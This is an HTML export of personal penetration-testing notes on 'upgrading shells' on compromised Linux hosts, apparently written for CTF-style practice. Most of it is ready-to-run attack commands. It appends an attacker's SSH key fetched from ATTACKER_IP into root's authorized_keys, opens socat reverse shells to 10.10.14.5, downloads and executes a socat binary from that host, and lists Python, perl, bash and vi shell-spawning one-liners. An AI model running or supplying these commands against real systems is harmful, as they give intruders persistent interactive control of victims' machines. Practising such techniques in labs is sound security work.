<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Upgrading Shells</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Priv-Esc - Linux - Upgrading Shells</h1></strong><br />Sometimes you&#39;ll need to upgrade the shell you have on a system.<br />For example,<br />• from a non-tty to a tty shell<br />• from a restricted shell to an unrestricted shell<br />• from www-data web shell (who aren&#39;t supposed to have shells) to a legitimate user<br /><br />Without a tty shell, you can&#39;t use interactive commands <code>su</code> or <code>nano</code> or <code>vi</code>.<br /><br /><strong>Links</strong><br />• <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a><br /><br /><strong><h2>## ssh</h2></strong><br />Upgrading to ssh is ideal and easy if it&#39;s possible. <br />Refer to the sub-node for a more detailed explanation.<br /><br />Generate ssh key pair<br /><code>ssh-keygen -t rsa -b 4096</code><strong><br /></strong>Start ssh service<br /><code>service ssh start</code><br />Copy your public key to a working directory<br /><code>mkdir serve; cd serve; cp /root/.ssh/id_rsa.pub .</code><br />Start a python web server<br /><code>python -m SimpleHTTPServer</code><br />On target, retrieve your public key and append it into the authorized_keys file <br /><code>echo $(wget http://ATTACKER_IP:8000/.ssh/id_rsa.pub) &gt;&gt; /root/.ssh/authorized_keys</code><br /><br /><strong><h2>## socat</h2></strong><br />If ssh isn&#39;t available, <code>socat</code> is a satisfactory second option.<br /><code>socat</code> is basically <code>netcat</code> on steroids.<br />You&#39;ll have a full interactive shell with tab-completion, arrow keys, nano support etc.<br /><br />Start a listener on your attacking machine<br /><code>socat file:`tty`,raw,echo=0 tcp-listen:9001</code><br /><br />From the victim, connect to your listener.<br /><code>socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.14.5:9001</code><br /><br /><strong><h3>### No socat installed?</h3></strong><br />HOWEVER, most systems won&#39;t have socat installed.<br />To get around this, you can download a precompiled socat binary to the target, make it executable, and run it.<br />The downside to this is that you&#39;re dropping files onto the taraget, the plus side is that you have a fully interactive shell.<br /><br />• <a href="https://github.com/andrew-d/static-binaries/tree/master/binaries/linux">https://github.com/andrew-d/static-binaries/tree/master/binaries/linux</a> - precomiled linux binaries<br /><br />Download the binary to your attacking machine<br /><code>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat</code><br />Serve it to the target with a python web server<br /><code>python -m SimpleHTTPServer</code><br />Download socat, make it executable, and run it to connect back to your listenre <br /><code>wget -q http://10.10.14.5:8000/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.14.5:9001</code><br /><br /><strong><h2>## Python</h2></strong><br />From python you can spawn a tty shell.<br /><br /><strong><h3>### python2</h3></strong><br /><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code> <br /><br /><strong><h3>### python3</h3></strong><br />Also try python3 incase python2 isn&#39;t available<br /><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br /><br /><strong><h2>## rlwrap</h2></strong><br /><code>rlwrap</code> will enhance the shell, allowing you to clear the screen with <code>[CTRL] + [L]</code><br /><br />1. Listener:<br /><code>rlwrap nc localhost 80</code><br />2. Target:<br /><code>ctrl+z</code> - background the shell<br />3. Attacker:<br /><code>echo $TERM &amp;&amp; tput lines &amp;&amp; tput cols</code><br /><code>stty raw -echo</code><br /><code>fg</code><br />4. Target:<br /><code>reset</code><br /><code>export SHELL=bash</code><br /><code>export TERM=xterm-256color</code><br /><code>stty rows &lt;num&gt; columns &lt;cols&gt;</code><br /><br /><strong><h2>## Linux Commands</h2></strong><br />A collection of linux commands that might help you upgrade your shell.<br /><br /><strong><h3>### echo</h3></strong><br /><code>echo os.system(&quot;/bin/bash&quot;)</code><br /><br /><strong><h3>### sh</h3></strong><br /><code>/bin/sh -i</code><br /><br /><strong><h3>### bash</h3></strong><br /><code>/bin/bash -i</code><br />        <br /><strong>Preserve Permissions</strong><br />If you&#39;re running as a user, <code>-p</code> will preserve the permissions of the user you currently are<br /><code>bash -p</code><br /><br /><strong><h3>### perl</h3></strong><br /><code>perl -e &#39;exec &quot;/bin/sh&quot;;&#39;</code><br /><br /><strong><h3>### vi<br /></h3></strong>You can execute commands from within Vi.<br /><code>:!bash</code></div>
</body>
</html>
